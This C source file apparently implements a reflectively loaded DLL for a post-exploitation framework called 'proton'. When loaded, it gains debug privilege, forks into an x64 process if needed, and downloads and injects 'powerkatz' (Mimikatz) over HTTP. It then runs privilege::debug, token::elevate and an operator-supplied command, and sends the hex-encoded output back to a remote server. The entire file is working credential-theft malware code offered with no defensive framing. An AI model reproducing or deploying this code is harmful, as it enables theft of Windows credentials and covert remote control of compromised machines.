#include <stdlib.h>
#include <stdio.h>

#include "ReflectiveLoader.h"

#include "../proton_types.h"
#include "../proton_util.h"
#include "../proton_process.h"
#include "../proton_net.h"
#include "../proton_load.h"

extern HINSTANCE hAppInstance;

void report_mimikatz_output(proton_shim_parsed * parsed, wchar_t * output) 
{
	size_t len = wcslen(output);
	char * output_as_bytes = (char *)output;

	char * output_buffer = (char *)malloc(len * 4 + 1);
	memset(output_buffer, 0, len * 4 + 1);

	for (size_t i = 0; i < len * 2; i++) 
	{
		sprintf(&output_buffer[i * 2], "%02X", output_as_bytes[i]);
	}
	
	proton_http_report_work(parsed, output_buffer);
}

void proton_mimikatz_shim(LPWSTR shim)
{
	char *data;
	DWORD dwSize;
	proton_shim_parsed parsed;

	__try
	{
		// we have to pass stupid Unicode string in, cuz making structs in JScript is nothx
		// if this errors we can't even report_error
		if (!proton_parse_shim(shim, &parsed))
			return;

		// if this fails, wtf? elevate nub
		if (!proton_get_debug_priv())
		{
			proton_http_report_error(&parsed, "Failed to get SeDebugPriv.");
			// don't return, keep trying lil buddy
		}

		// if we are Wow64 process (x86 .exe on x64 CPU), we need to fork
		if (!proton_cpu_matches_process())
		{
			// get the x64 DLL via web request
			if (!proton_http_get_x64_shim(&parsed, &data, &dwSize))
				return;

			// start an x64 process and reflectively load x64 DLL in it
			if (!proton_fork_x64(&parsed, shim, data, dwSize))
				proton_http_report_error(&parsed, "Failed to fork to x64.");
			else
				proton_http_report_work(&parsed, "Successfully forked to x64.");

			return;
		}

		// if we got here, we can download powerkatz and inject it
		if (!proton_http_get_powerkatz(&parsed, &data, &dwSize))
			return;
		
		HMODULE hPowerkatz = powerkatz_reflective_load((LPVOID)data, NULL);

		if (!hPowerkatz)
		{
			proton_http_report_error(&parsed, "Failed to load powerkatz.dll.");
			return;
		}

		wchar_t *output;


		// nothing interesting happens without these
		output = powerkatz_invoke(hPowerkatz, L"privilege::debug");
		report_mimikatz_output(&parsed, output);

		output = powerkatz_invoke(hPowerkatz, L"token::elevate");
		report_mimikatz_output(&parsed, output);

		WCHAR mimicmd[sizeof(parsed.mimicmd)];

		mbstowcs(mimicmd, parsed.mimicmd, sizeof(mimicmd));

		output = powerkatz_invoke(hPowerkatz, mimicmd);
		report_mimikatz_output(&parsed, output);

		proton_http_report_work(&parsed, "Complete");

		ExitProcess(0);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		__try
		{
			proton_http_report_error(&parsed, "Catastrophic error occurred!");
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			// nop
		}
	}
}


BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			proton_mimikatz_shim((LPWSTR)lpReserved);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}